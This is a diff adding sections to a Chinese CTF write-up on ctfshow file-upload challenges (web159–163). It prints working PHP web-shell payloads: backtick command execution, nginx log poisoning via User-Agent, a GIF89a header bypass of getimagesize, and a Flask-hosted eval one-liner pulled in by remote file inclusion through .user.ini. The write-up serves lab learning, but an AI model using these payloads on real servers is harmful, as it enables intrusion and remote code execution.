@@ -79,3 +79,81 @@ nothing here？说明此处有个php页面，那么这个题考察的就是.user
 ## web159(同上)
 
 过滤了（ 用反引号绕过：``<?=`tac ../flag.*`?>``
+
+## web160(日志包含)
+
+在上面的基础上过滤了反引号，系统命令不能用了，考虑日志包含
+
+``<?=include"/var/lo"."g/nginx/access.lo"."g"?>``
+
+![image-20220117175904340](image/ctfshow-文件上传(151-170)/image-20220117175904340.png)
+
+然后在UA中插入一句话
+
+![image-20220117180133199](image/ctfshow-文件上传(151-170)/image-20220117180133199.png)
+
+最后getshell
+
+![image-20220117180151043](image/ctfshow-文件上传(151-170)/image-20220117180151043.png)
+
+## web161(GIF89a)
+
+小知识点：GIF89a文件头欺骗，php下的检测函数getimagesize无法认定其图片无效
+
+```php
+//检查是否图片
+    if(function_exists('getimagesize')) {
+        $tmp_imagesize = @getimagesize($new_name);
+        list($tmp_width, $tmp_height, $tmp_type) = (array)$tmp_imagesize;
+        $tmp_size = $tmp_width * $tmp_height;
+        if($tmp_size > 16777216 || $tmp_size < 4 || empty($tmp_type) || strpos($tmp_imagesize['mime'], 'flash') > 0) {
+            @unlink($new_name);
+            return cplang('only_allows_upload_file_types');
+        }
+    }
+```
+
+如果使用这个函数读取文件头为GIF89a的图片，php会认定这只是一个尺寸比较大的合法图片，所以存在检测漏洞
+
+回到这个题，上传的时候加上GIF89a头就可以了
+
+![image-20220117181330308](image/ctfshow-文件上传(151-170)/image-20220117181330308.png)
+
+## web162(远程包含)
+
+这个题过滤了文件内容中的. 也就是说上传的.user.ini是不能包含带后缀的文件的，在原wp中是要通过条件竞争的方式去解，思路是上传的速度要比服务器删除的速度快，所以采用竞争，但是因为最近群主大大限制了并发，条件竞争并不能做了，所以采用远程文件包含的方式
+
+1. 拥有一台vps，并用flask将php一句话绑定在80端口上
+
+   ```python
+   '''
+   Author: KonDream
+   Date: 2022-01-03 22:45:59
+   LastEditors:  KonDream
+   LastEditTime: 2022-01-05 13:10:08
+   Description:  
+   '''
+   from flask import *
+   
+   app = Flask(__name__)
+   
+   # 首页路由
+   @app.route('/',methods=['GET', 'POST'])
+   def index():
+       return "<?php eval($_POST[1]);?>"
+   
+   if __name__ == "__main__":
+       app.run(host='0.0.0.0', port=80, debug=True)
+   ```
+
+2. 上传.user.ini，绑定一个不带后缀的文件k![image-20220117193202242](image/ctfshow-文件上传(151-170)/image-20220117193202242.png)
+
+3. 上传k，并包含远程vps地址，由于过滤了ip中的. 所以要将ip地址转数字，这里转：http://www.msxindl.com/tools/ip/ip_num.asp![image-20220117193804385](image/ctfshow-文件上传(151-170)/image-20220117193804385.png)
+
+4. 最后访问upload，即可getshell![image-20220117193859464](image/ctfshow-文件上传(151-170)/image-20220117193859464.png)
+
+## web163(配置文件包含)
+
+思路同上，但是上传的文件会被服务器立刻删掉，原预期解是通过竞争的方式，但是现在不行，所以就包含在配置文件里![image-20220117194817052](image/ctfshow-文件上传(151-170)/image-20220117194817052.png)![image-20220117194835364](image/ctfshow-文件上传(151-170)/image-20220117194835364.png)
+
+值得注意的是这个题文件不会覆盖，所以只能包含一次，如果写错文件那么就要重开环境了hhh，而且162和163这种做法都要求服务器支持远程文件包含，如果服务器没开启这个选项的话那么就没办法这样做了
